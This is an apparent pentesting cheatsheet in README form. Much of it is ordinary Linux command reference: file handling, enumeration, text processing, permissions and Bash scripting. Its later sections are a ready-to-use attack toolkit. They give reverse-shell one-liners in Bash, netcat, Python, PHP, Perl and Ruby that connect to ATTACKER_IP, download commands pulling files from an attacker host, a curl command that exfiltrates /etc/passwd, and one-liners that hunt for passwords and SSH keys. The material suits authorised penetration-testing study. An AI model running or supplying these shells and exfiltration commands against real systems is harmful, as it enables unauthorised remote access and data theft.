# 🐧 Linux Commands & Bash - Complete Pentesting Cheatsheet

```
  ██╗     ██╗███╗   ██╗██╗   ██╗██╗  ██╗
  ██║     ██║████╗  ██║██║   ██║╚██╗██╔╝
  ██║     ██║██╔██╗ ██║██║   ██║ ╚███╔╝ 
  ██║     ██║██║╚██╗██║██║   ██║ ██╔██╗ 
  ███████╗██║██║ ╚████║╚██████╔╝██╔╝ ██╗
  ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝
   ██████╗ ██████╗ ███╗   ███╗███╗   ███╗ █████╗ ███╗   ██╗██████╗ ███████╗
  ██╔════╝██╔═══██╗████╗ ████║████╗ ████║██╔══██╗████╗  ██║██╔══██╗██╔════╝
  ██║     ██║   ██║██╔████╔██║██╔████╔██║███████║██╔██╗ ██║██║  ██║███████╗
  ██║     ██║   ██║██║╚██╔╝██║██║╚██╔╝██║██╔══██║██║╚██╗██║██║  ██║╚════██║
  ╚██████╗╚██████╔╝██║ ╚═╝ ██║██║ ╚═╝ ██║██║  ██║██║ ╚████║██████╔╝███████║
   ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚══════╝
```

<p align="center">
  <img src="https://img.shields.io/badge/Linux-black?style=for-the-badge&logo=linux" alt="Linux">
  <img src="https://img.shields.io/badge/Bash-green?style=for-the-badge&logo=gnubash" alt="Bash">
  <img src="https://img.shields.io/badge/Pentesting-red?style=for-the-badge" alt="Pentesting">
</p>

---

## 📋 Table of Contents

- [Navigation & Files](#-navigation--files)
- [System Enumeration](#-system-enumeration)
- [User Enumeration](#-user-enumeration)
- [Network Commands](#-network-commands)
- [File Search & Analysis](#-file-search--analysis)
- [Text Processing](#-text-processing)
- [Permissions & Ownership](#-permissions--ownership)
- [Process Management](#-process-management)
- [Package Management](#-package-management)
- [Bash Scripting](#-bash-scripting)
- [Reverse Shells](#-reverse-shells)
- [File Transfers](#-file-transfers)
- [One-Liners](#-one-liners)

---

## 📁 Navigation & Files

### Directory Navigation

```bash
# Current directory
pwd

# Change directory
cd /path/to/dir
cd ..          # Parent directory
cd ~           # Home directory
cd -           # Previous directory

# List files
ls
ls -la         # Long format, all files
ls -lah        # Human readable sizes
ls -latr       # Sort by time, reverse
ll             # Alias for ls -la (most distros)
```

### File Operations

```bash
# Create files/directories
touch file.txt
mkdir directory
mkdir -p dir1/dir2/dir3    # Create parent dirs

# Copy
cp source dest
cp -r source_dir dest_dir  # Recursive

# Move/Rename
mv source dest
mv oldname newname

# Delete
rm file
rm -r directory            # Recursive
rm -rf directory           # Force, no prompt

# View files
cat file.txt
less file.txt              # Pager
more file.txt
head -n 20 file.txt        # First 20 lines
tail -n 20 file.txt        # Last 20 lines
tail -f file.txt           # Follow (live)
```

### Archives & Compression

```bash
# tar
tar -cvf archive.tar files/      # Create
tar -xvf archive.tar             # Extract
tar -czvf archive.tar.gz files/  # Create gzipped
tar -xzvf archive.tar.gz         # Extract gzipped

# zip/unzip
zip archive.zip file1 file2
zip -r archive.zip directory/
unzip archive.zip

# gzip/gunzip
gzip file
gunzip file.gz

# 7zip
7z x archive.7z
```

---

## 🔍 System Enumeration

### System Information

```bash
# Hostname
hostname
hostname -I               # IP addresses

# OS/Kernel
uname -a                  # All info
uname -r                  # Kernel version
cat /etc/os-release       # OS info
cat /etc/issue            # OS banner
cat /proc/version         # Kernel/compiler info

# Architecture
arch
uname -m

# Hardware
lscpu                     # CPU info
cat /proc/cpuinfo
free -h                   # Memory
df -h                     # Disk space
lsblk                     # Block devices
```

### Environment

```bash
# Environment variables
env
printenv
echo $PATH
echo $HOME
echo $USER
echo $SHELL

# Set variable
export VAR="value"
VAR="value"
```

### Running Services

```bash
# Systemd
systemctl list-units --type=service
systemctl list-units --type=service --state=running
systemctl status service_name

# Init.d
service --status-all
service service_name status

# Check listening ports
ss -tulpn
netstat -tulpn
```

### Cron Jobs

```bash
# User crontab
crontab -l

# System crontabs
cat /etc/crontab
ls -la /etc/cron.*
cat /etc/cron.d/*

# Watch for cron (use pspy)
./pspy64
```

### Installed Packages

```bash
# Debian/Ubuntu
dpkg -l
apt list --installed

# RHEL/CentOS
rpm -qa
yum list installed

# Find package
dpkg -l | grep package
which binary
whereis binary
```

---

## 👤 User Enumeration

### Current User

```bash
# Who am I
whoami
id
id username

# Groups
groups
groups username

# Privileges
sudo -l                   # Sudo permissions
cat /etc/sudoers          # Sudoers file (needs root)
```

### All Users

```bash
# User list
cat /etc/passwd
cat /etc/passwd | cut -d: -f1
getent passwd

# Users with shell
cat /etc/passwd | grep -v "nologin\|false"
grep -v "nologin\|false" /etc/passwd

# Password hashes (needs root)
cat /etc/shadow

# Recently logged in
last
lastlog
w
who
users
```

### Interesting Files

```bash
# SSH keys
ls -la ~/.ssh/
cat ~/.ssh/id_rsa
cat ~/.ssh/authorized_keys

# History
cat ~/.bash_history
cat ~/.zsh_history
history

# Config files
cat ~/.bashrc
cat ~/.profile
cat /etc/profile
```

---

## 🌐 Network Commands

### Network Configuration

```bash
# IP address
ip a
ip addr show
ifconfig

# Routes
ip route
route -n
netstat -rn

# DNS
cat /etc/resolv.conf
cat /etc/hosts

# ARP table
arp -a
ip neigh
```

### Open Ports & Connections

```bash
# Listening ports
ss -tulpn
ss -tlnp                  # TCP only
netstat -tulpn
netstat -ano

# Active connections
ss -tup
netstat -an | grep ESTABLISHED

# Find process by port
lsof -i :80
fuser 80/tcp
```

### Network Testing

```bash
# Ping
ping -c 4 host

# Traceroute
traceroute host
tracepath host

# DNS lookup
host domain.com
dig domain.com
nslookup domain.com

# Port check
nc -zv host port
timeout 1 bash -c "</dev/tcp/host/port" && echo open

# Curl
curl -I http://host       # Headers only
curl -s http://host       # Silent
curl -k https://host      # Ignore SSL
wget http://host/file
```

### Firewall

```bash
# iptables
iptables -L -n -v
iptables -L INPUT -n --line-numbers

# UFW (Ubuntu)
ufw status
ufw status verbose

# firewalld (CentOS)
firewall-cmd --list-all
```

---

## 🔎 File Search & Analysis

### Find Command

```bash
# Find by name
find / -name "filename" 2>/dev/null
find / -iname "*.txt" 2>/dev/null      # Case insensitive

# Find by type
find / -type f -name "*.conf"          # Files
find / -type d -name "backup"          # Directories

# Find by permissions
find / -perm -4000 2>/dev/null         # SUID
find / -perm -2000 2>/dev/null         # SGID
find / -perm -o+w 2>/dev/null          # World writable

# Find by owner
find / -user root 2>/dev/null
find / -group admin 2>/dev/null

# Find by size
find / -size +100M 2>/dev/null         # Larger than 100MB
find / -size -1k 2>/dev/null           # Smaller than 1KB

# Find by time
find / -mtime -7 2>/dev/null           # Modified in last 7 days
find / -atime +30 2>/dev/null          # Accessed more than 30 days ago

# Find and execute
find / -name "*.sh" -exec chmod +x {} \;
find / -name "*.log" -exec rm {} \;
```

### Grep (Search in files)

```bash
# Basic search
grep "pattern" file
grep -i "pattern" file                 # Case insensitive
grep -r "pattern" /path/               # Recursive
grep -rn "pattern" /path/              # With line numbers

# Inverse match
grep -v "pattern" file                 # Lines NOT matching

# Count matches
grep -c "pattern" file

# Show context
grep -A 3 "pattern" file               # 3 lines after
grep -B 3 "pattern" file               # 3 lines before
grep -C 3 "pattern" file               # 3 lines around

# Regex
grep -E "regex" file                   # Extended regex
egrep "regex" file

# Multiple patterns
grep -E "pattern1|pattern2" file
```

### Locate & Which

```bash
# Locate (needs updatedb)
locate filename
updatedb                               # Update database

# Which (find binary)
which binary
whereis binary
type command
```

### File Analysis

```bash
# File type
file filename

# Strings in binary
strings binary
strings binary | grep password

# Hexdump
xxd file
hexdump -C file

# Hash
md5sum file
sha256sum file
sha1sum file
```

---

## ✂️ Text Processing

### Cut

```bash
# Cut by delimiter
cut -d: -f1 /etc/passwd                # First field, : delimiter
cut -d: -f1,3 /etc/passwd              # Fields 1 and 3

# Cut by character position
cut -c1-10 file                        # Characters 1-10
```

### Awk

```bash
# Print columns
awk '{print $1}' file                  # First column
awk '{print $1, $3}' file              # Columns 1 and 3
awk -F: '{print $1}' /etc/passwd       # Custom delimiter

# Conditions
awk '$3 > 1000' /etc/passwd            # Where field 3 > 1000
awk '/pattern/ {print $1}' file        # Matching lines

# Built-in variables
awk '{print NR, $0}' file              # Line numbers
awk 'END {print NR}' file              # Total lines
```

### Sed

```bash
# Substitute
sed 's/old/new/' file                  # First occurrence
sed 's/old/new/g' file                 # All occurrences
sed -i 's/old/new/g' file              # In-place edit

# Delete lines
sed '/pattern/d' file                  # Delete matching
sed '5d' file                          # Delete line 5
sed '1,5d' file                        # Delete lines 1-5

# Print specific lines
sed -n '5p' file                       # Print line 5
sed -n '1,10p' file                    # Print lines 1-10
```

### Sort & Uniq

```bash
# Sort
sort file
sort -r file                           # Reverse
sort -n file                           # Numeric
sort -u file                           # Unique only
sort -t: -k3 -n /etc/passwd            # By field 3

# Unique
uniq file                              # Remove adjacent duplicates
sort file | uniq                       # Remove all duplicates
uniq -c file                           # Count occurrences
sort file | uniq -c | sort -rn         # Count and sort
```

### Other Useful

```bash
# Word count
wc -l file                             # Lines
wc -w file                             # Words
wc -c file                             # Bytes

# Column formatting
column -t file                         # Tabulate
column -s: -t /etc/passwd              # Custom separator

# tr (translate)
echo "HELLO" | tr 'A-Z' 'a-z'          # Lowercase
cat file | tr -d '\n'                  # Remove newlines

# xargs
find . -name "*.txt" | xargs rm
cat urls.txt | xargs -I {} curl {}
```

---

## 🔐 Permissions & Ownership

### Understanding Permissions

```
-rwxr-xr-x
│└┬┘└┬┘└┬┘
│ │  │  └── Others (r-x = 5)
│ │  └───── Group  (r-x = 5)
│ └──────── Owner  (rwx = 7)
└────────── File type (- = file, d = directory)
```

### Chmod

```bash
# Numeric
chmod 755 file                         # rwxr-xr-x
chmod 644 file                         # rw-r--r--
chmod 777 file                         # rwxrwxrwx

# Symbolic
chmod +x file                          # Add execute
chmod -w file                          # Remove write
chmod u+x file                         # User execute
chmod g+w file                         # Group write
chmod o-r file                         # Others no read

# Recursive
chmod -R 755 directory/
```

### Chown

```bash
# Change owner
chown user file
chown user:group file
chown -R user:group directory/

# Change group only
chgrp group file
```

### Special Permissions

```bash
# SUID (Set User ID) - 4
chmod u+s file
chmod 4755 file

# SGID (Set Group ID) - 2
chmod g+s directory
chmod 2755 directory

# Sticky Bit - 1
chmod +t directory
chmod 1755 directory

# Find SUID/SGID
find / -perm -4000 2>/dev/null         # SUID
find / -perm -2000 2>/dev/null         # SGID
```

---

## ⚙️ Process Management

### View Processes

```bash
# List processes
ps aux
ps -ef
ps aux | grep process_name

# Top (live)
top
htop                                   # Better version

# Process tree
pstree
ps auxf
```

### Process Control

```bash
# Background/Foreground
command &                              # Run in background
Ctrl+Z                                 # Suspend
bg                                     # Resume in background
fg                                     # Bring to foreground
jobs                                   # List jobs

# Kill process
kill PID
kill -9 PID                            # Force kill
killall process_name
pkill process_name

# Nice (priority)
nice -n 10 command                     # Lower priority
renice 10 -p PID
```

---

## 📦 Package Management

### Debian/Ubuntu (apt/dpkg)

```bash
# Update
apt update
apt upgrade

# Install
apt install package
dpkg -i package.deb

# Remove
apt remove package
apt purge package                      # Remove with configs

# Search
apt search package
apt-cache search package

# Info
apt show package
dpkg -l | grep package
```

### RHEL/CentOS (yum/dnf)

```bash
# Update
yum update
dnf update

# Install
yum install package
dnf install package

# Remove
yum remove package

# Search
yum search package

# Info
yum info package
rpm -qa | grep package
```

---

## 💻 Bash Scripting

### Basics

```bash
#!/bin/bash

# Variables
NAME="value"
echo $NAME
echo "${NAME}_suffix"

# Command substitution
DATE=$(date)
FILES=`ls -la`

# Read input
read -p "Enter name: " NAME
echo "Hello $NAME"
```

### Conditionals

```bash
# if/else
if [ condition ]; then
    echo "true"
elif [ condition2 ]; then
    echo "condition2"
else
    echo "false"
fi

# Comparisons (strings)
if [ "$str1" = "$str2" ]; then
if [ "$str1" != "$str2" ]; then
if [ -z "$str" ]; then                 # Empty
if [ -n "$str" ]; then                 # Not empty

# Comparisons (numbers)
if [ $num1 -eq $num2 ]; then           # Equal
if [ $num1 -ne $num2 ]; then           # Not equal
if [ $num1 -gt $num2 ]; then           # Greater than
if [ $num1 -lt $num2 ]; then           # Less than

# File tests
if [ -e file ]; then                   # Exists
if [ -f file ]; then                   # Is file
if [ -d dir ]; then                    # Is directory
if [ -r file ]; then                   # Readable
if [ -w file ]; then                   # Writable
if [ -x file ]; then                   # Executable
```

### Loops

```bash
# for loop
for i in 1 2 3 4 5; do
    echo $i
done

for i in {1..10}; do
    echo $i
done

for file in *.txt; do
    echo $file
done

for i in $(cat list.txt); do
    echo $i
done

# while loop
while [ condition ]; do
    echo "loop"
done

while read line; do
    echo $line
done < file.txt

# C-style for
for ((i=0; i<10; i++)); do
    echo $i
done
```

### Functions

```bash
# Define function
function_name() {
    echo "Argument 1: $1"
    echo "Argument 2: $2"
    echo "All args: $@"
    echo "Num args: $#"
}

# Call function
function_name arg1 arg2
```

### Script Example

```bash
#!/bin/bash
# Port scanner

if [ $# -ne 1 ]; then
    echo "Usage: $0 <target>"
    exit 1
fi

TARGET=$1

for PORT in {1..1000}; do
    timeout 1 bash -c "echo >/dev/tcp/$TARGET/$PORT" 2>/dev/null && echo "Port $PORT open"
done
```

---

## 🔌 Reverse Shells

### Bash

```bash
# Bash TCP
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# Bash UDP
bash -i >& /dev/udp/ATTACKER_IP/PORT 0>&1
```

### Netcat

```bash
# nc with -e
nc -e /bin/bash ATTACKER_IP PORT

# nc without -e
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP PORT > /tmp/f
```

### Python

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### PHP

```bash
php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Perl

```bash
perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Ruby

```bash
ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Upgrade Shell

```bash
# Spawn TTY
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
script /dev/null -c bash

# Full TTY
# In reverse shell:
python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl+Z
# On attacker:
stty raw -echo; fg
# In shell:
export TERM=xterm
stty rows 40 cols 150
```

---

## ⬇️ File Transfers

### From Attacker to Target

```bash
# wget
wget http://ATTACKER_IP/file -O /tmp/file

# curl
curl http://ATTACKER_IP/file -o /tmp/file

# nc
# Attacker: nc -lvnp 4444 < file
nc ATTACKER_IP 4444 > file

# scp
scp user@ATTACKER_IP:/path/file /tmp/

# base64 (for small files)
# Attacker: base64 file
echo "BASE64_STRING" | base64 -d > file
```

### From Target to Attacker

```bash
# nc
# Attacker: nc -lvnp 4444 > file
nc ATTACKER_IP 4444 < file

# curl (POST)
curl -X POST -F "file=@/etc/passwd" http://ATTACKER_IP/upload

# base64
base64 file
# Copy output to attacker and decode
```

### Start HTTP Server

```bash
# Python 2
python -m SimpleHTTPServer 8000

# Python 3
python3 -m http.server 8000

# PHP
php -S 0.0.0.0:8000

# Ruby
ruby -run -e httpd . -p 8000
```

---

## ⚡ One-Liners

### Useful Pentest One-Liners

```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Find writable directories
find / -writable -type d 2>/dev/null

# Find world-writable files
find / -perm -o+w -type f 2>/dev/null

# Find config files with passwords
grep -r "password" /etc/ 2>/dev/null
grep -ri "pass\|pwd\|secret" /var/www/ 2>/dev/null

# Find SSH keys
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# Quick port scan
for p in {1..65535}; do timeout 1 bash -c "echo >/dev/tcp/TARGET/$p" 2>/dev/null && echo "$p open"; done

# Ping sweep
for i in {1..254}; do ping -c 1 -W 1 192.168.1.$i | grep "from" & done

# Extract IPs from file
grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" file

# Base64 encode/decode
echo "string" | base64
echo "c3RyaW5n" | base64 -d

# URL encode/decode
echo "string" | xxd -plain | sed 's/\(..\)/%\1/g'
echo "%73%74%72%69%6e%67" | xxd -r -p
```

### Quick Reference Table

| Purpose | Command |
|---------|---------|
| Current user | `whoami` / `id` |
| System info | `uname -a` |
| IP address | `ip a` / `hostname -I` |
| Open ports | `ss -tulpn` |
| Running processes | `ps aux` |
| Find SUID | `find / -perm -4000 2>/dev/null` |
| Writable dirs | `find / -writable -type d 2>/dev/null` |
| Download file | `wget http://url/file` |
| Reverse shell | `bash -i >& /dev/tcp/IP/PORT 0>&1` |
| Upgrade TTY | `python3 -c 'import pty;pty.spawn("/bin/bash")'` |

---

## 📚 Resources

- [GTFOBins](https://gtfobins.github.io/)
- [HackTricks Linux](https://book.hacktricks.xyz/linux-hardening)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [Reverse Shell Cheatsheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

### Related Cheatsheets
- [Linux PrivEsc](../Linux-PrivEsc/README.md)
- [Nmap](../Nmap/README.md)
- [Metasploit](../Metasploit/README.md)

---

<p align="center">
  <b>🐧 Master Linux for Pentesting!</b><br>
  <i>Command line is your best friend</i>
</p>
